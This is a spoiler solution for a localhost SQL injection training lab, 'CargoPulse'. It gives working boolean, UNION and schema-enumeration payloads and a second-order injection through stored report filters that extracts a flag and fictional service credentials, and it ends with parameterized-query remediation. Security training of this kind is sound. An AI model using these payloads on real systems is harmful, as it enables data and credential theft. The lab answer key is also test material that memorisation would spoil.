# SPOILER — LAB SOLUTION

**WARNING: This document contains the complete solution to the CargoPulse SQL injection training lab. Only read this after attempting the lab independently.**

---

## Complete Attack Walkthrough

### Stage 1: Discover the Vulnerable Endpoint

1. Navigate to `http://localhost:8080/login`
2. Login with credentials: `customer@cargopulse.test` / `LabPass123!`
3. Go to `/portal/shipments/search` (Shipment Lookup)
4. Test normal tracking number: `CP-AX91-4821` → Returns shipment
5. Test invalid: `does-not-exist` → Returns "No shipment found."

### Stage 2: Confirm SQL Injection

In Burp Suite Repeater, send requests to:
```
GET /portal/shipments/search?tracking=CP-AX91-4821
```

Test boolean conditions:
- `CP-AX91-4821' AND '1'='1` → Returns same shipment (TRUE)
- `CP-AX91-4821' AND '1'='2` → Returns "No shipment found." (FALSE)

This confirms SQL injection in the tracking parameter.

### Stage 3: Determine Column Count

Test UNION injection with increasing column counts:
```sql
CP-AX91-4821' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--  -- Fails (6 columns)
CP-AX91-4821' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--  -- Works (7 columns)
```

**Result**: Query has 7 columns matching the `shipments` table:
1. id (integer)
2. tracking_number (string)
3. customer_name (string)
4. origin (string)
5. destination (string)
6. shipped_at (datetime)
7. is_restricted (boolean)

### Stage 4: Enumerate Database Schema

Extract table and column information:
```sql
CP-AX91-4821' UNION SELECT NULL, table_name, column_name, data_type, NULL, NULL, NULL 
  FROM information_schema.columns 
  WHERE table_schema='public' 
  AND table_name IN ('users', 'shipments', 'shipment_events', 'warehouse_notes', 'report_jobs', 'internal_credentials', 'security_challenges') 
  ORDER BY table_name, ordinal_position--
```

**Key Tables Discovered**:
- `users` - Application users with roles
- `shipments` - Shipment tracking data
- `shipment_events` - Event history
- `warehouse_notes` - Internal notes
- `report_jobs` - Stored report filters (SECOND-ORDER VECTOR)
- `internal_credentials` - Service account credentials (fictional)
- `security_challenges` - **CONTAINS THE FLAG**

### Stage 5: Discover the Report Workflow

Query the special shipment CP-VOID-7719:
```sql
CP-AX91-4821' UNION SELECT NULL, tracking_number, customer_name, origin, destination, shipped_at, metadata 
  FROM shipments WHERE tracking_number='CP-VOID-7719'--
```

This shipment has `is_restricted = true` and its metadata contains a reference to a legacy enrichment process that writes to the `report_jobs` table.

Query the report jobs table:
```sql
CP-AX91-4821' UNION SELECT NULL, report_type, filter_expression, status, result_reference, user_id, created_at 
  FROM report_jobs--
```

You'll see existing report filters like:
- `is_restricted = 0 AND customer_name LIKE '%Medical%'`
- `destination LIKE '%Texas%' OR origin LIKE '%Chicago%'`
- `event_type = 'CUSTOMS_REVIEW'`
- `1=1` (safe filter matching all)
- `tracking_number LIKE 'CP-%'`

### Stage 6: Craft Second-Order SQL Injection

As an operations user (or after discovering the report workflow), create a report with a malicious filter:

1. Login as `operations@cargopulse.test` / `LabPass123!`
2. Go to `/ops/reports/create`
3. Report Type: `exfiltration` (or any value)
4. Filter Expression:
   ```sql
   1=1 UNION SELECT id, challenge_name, flag, description, NULL, NULL, NULL FROM security_challenges--
   ```
5. Click "Save Report Filter"

The filter is stored in `report_jobs.filter_expression` with status `pending`.

### Stage 7: Trigger Second-Order Injection

1. Go to `/ops/reports` (Report Queue)
2. Find your newly created report job (note the ID)
3. Click "Generate" or visit `/ops/reports/generate?job_id=<ID>`
4. The report worker processes the stored filter, concatenating it into SQL:
   ```sql
   SELECT s.*, COUNT(se.id) as event_count
   FROM shipments s
   LEFT JOIN shipment_events se ON s.id = se.shipment_id
   WHERE 1=1 UNION SELECT id, challenge_name, flag, description, NULL, NULL, NULL FROM security_challenges--
   GROUP BY s.id
   ORDER BY s.created_at DESC
   ```

### Stage 8: Retrieve the Flag

The report results will include a row from `security_challenges`:
```
id | challenge_name        | flag                               | description
---|-----------------------|------------------------------------|----------------------------------------
1  | Second-Order SQLi Chain | CP{second_order_sqli_chain_complete} | Flag obtained by chaining...
```

**FLAG: `CP{second_order_sqli_chain_complete}`**

---

## Alternative: Extract Internal Credentials

You can also extract the fictional service credentials:
```sql
1=1 UNION SELECT id, service_name, username, secret_value, environment, description, NULL FROM internal_credentials--
```

Results:
```
customs-sync        | customs_reporter    | TRAINING_ONLY_CREDENTIAL_CUSTOMS_2024
inventory-tracker   | inv_sync_bot        | TRAINING_ONLY_CREDENTIAL_INVENTORY_xyz
risk-analyzer       | risk_assessor       | TRAINING_ONLY_CREDENTIAL_RISK_alpha
```

---

## Summary of Key Insights

1. **The first SQLi is an information gathering tool** — it reveals the existence of the report workflow and the security_challenges table.

2. **The second SQLi is the exploitation path** — it requires understanding that stored data becomes executable SQL in a different context.

3. **Role boundaries matter** — The customer portal leaks information about the operations system, enabling the second-stage attack.

4. **The special shipment CP-VOID-7719 is a breadcrumb** — It's deliberately placed to guide discovery of the report workflow.

5. **Parameterized queries fix both vulnerabilities** — The secure implementation in `app/Security/` shows the correct approach.

---

## Post-Exploitation Verification

After obtaining the flag, verify the secure implementation blocks the attack:

1. Switch to secure controllers (update routes to use `app/Security/` classes)
2. Attempt the same injection payloads
3. Verify they return no results or validation errors
4. Confirm normal functionality still works

---

## Learning Outcomes

By completing this lab, you should understand:
- How to discover SQL injection through behavioral testing
- In-band UNION-based SQL injection for data extraction
- Database schema enumeration via `information_schema`
- Second-order SQL injection concepts and exploitation
- How trust boundaries between application components create attack paths
- Why "stored safely" ≠ "safe to execute as code"
- Proper remediation using parameterized queries and allowlists